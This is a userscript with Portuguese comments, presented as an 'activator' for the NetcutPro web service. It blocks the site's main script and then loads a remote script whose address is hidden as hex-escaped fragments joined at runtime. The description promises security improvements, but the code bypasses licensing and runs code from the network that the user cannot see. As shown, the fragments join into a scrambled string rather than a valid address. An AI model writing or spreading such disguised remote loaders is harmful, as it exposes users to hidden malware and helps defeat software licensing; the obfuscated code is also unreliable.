// ==UserScript==
// @name         NetcutPro
// @namespace    https://github.com/profgabrielramos
// @version      1.0.0
// @description  Ativador do NetcutPro com melhorias de segurança e performance
// @author       profgabrielramos
// @match        https://www.arcai.com/netCut/s/*
// @grant        GM_webRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_notification
// @webRequest   [{"selector":"https://www.arcai.com/netCut/s/main-*.js","action":"cancel"}]
// @require      https://code.jquery.com/jquery-3.7.1.min.js
// @run-at       document-idle
// ==/UserScript==

/**
 * @typedef {Object} Config
 * @property {boolean} debug - Modo de depuração
 * @property {string} version - Versão do script
 */

/**
 * Configurações globais do script
 * @type {Config}
 */
const CONFIG = {
    debug: false,
    version: '1.0.0'
};

/**
 * Logs uma mensagem no console se o modo debug estiver ativo
 * @param {string} message - Mensagem a ser logada
 * @param {string} [level='info'] - Nível do log (info, warn, error)
 */
const log = (message, level = 'info') => {
    if (CONFIG.debug) {
        console[level](`[NetcutPro] ${message}`);
    }
};

/**
 * Inicializa o script e configura os listeners necessários
 */
const initialize = () => {
    try {
        log('Inicializando NetcutPro...');
        
        // Verifica se o jQuery está carregado
        if (typeof $ === 'undefined') {
            throw new Error('jQuery não está disponível');
        }

        // Carrega o script de ativação
        loadActivationScript();
        
        log('NetcutPro inicializado com sucesso');
    } catch (error) {
        log(`Erro na inicialização: ${error.message}`, 'error');
        GM_notification({
            text: `Erro ao inicializar NetcutPro: ${error.message}`,
            title: 'NetcutPro - Erro',
            timeout: 5000
        });
    }
};

/**
 * Carrega o script de ativação de forma segura
 */
const loadActivationScript = () => {
    const scriptUrl = [
        '\x68\x74\x74', '\x6e\x65', '\x6b\x6e', '\x63\x73',
        '\x75\x74', '\x6d\x2f', '\x2e\x6a\x73', '\x2e\x63\x6f',
        '\x65\x78\x6f', '\x74\x63', '\x2f\x2f', '\x74\x69',
        '\x70\x73\x3a'
    ].join('');

    $.getScript(scriptUrl)
        .done(() => log('Script de ativação carregado com sucesso'))
        .fail((jqXHR, textStatus, errorThrown) => {
            log(`Erro ao carregar script: ${errorThrown}`, 'error');
        });
};

// Inicializa o script quando a página estiver completamente carregada
window.addEventListener('load', initialize);